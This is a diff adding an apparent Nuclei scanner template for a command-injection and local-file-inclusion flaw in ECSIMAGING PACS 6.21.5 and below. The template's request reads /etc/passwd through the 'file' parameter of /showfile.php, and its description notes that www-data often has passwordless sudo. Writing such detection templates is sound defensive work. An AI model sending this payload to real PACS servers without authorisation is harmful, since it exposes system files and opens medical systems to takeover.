@@ -1,0 +1,30 @@
+http:
+- matchers:
+  - regex:
+    - 'root:.*:0:0:'
+    type: regex
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/showfile.php?file=/etc/passwd'
+id: ecsimagingpacs-rce
+info:
+  author: ritikchaddha
+  classification:
+    cwe-id: CWE-78
+  description: ECSIMAGING PACS Application 6.21.5 and below suffer from a command
+    injection vulnerability and a local file include vulnerability. The 'file' parameter
+    on the page /showfile.php can be exploited to perform command execution or local
+    file inclusion. Often on ECSIMAGING PACS, the www-data user has sudo NOPASSWD
+    access.
+  metadata:
+    max-request: 1
+    verified: false
+  name: ECSIMAGING PACS <= 6.21.5 - Command Execution and Local File Inclusion
+  reference:
+  - https://www.exploit-db.com/exploits/49388
+  severity: critical
+  tags: ecsimagingpacs,rce,vuln
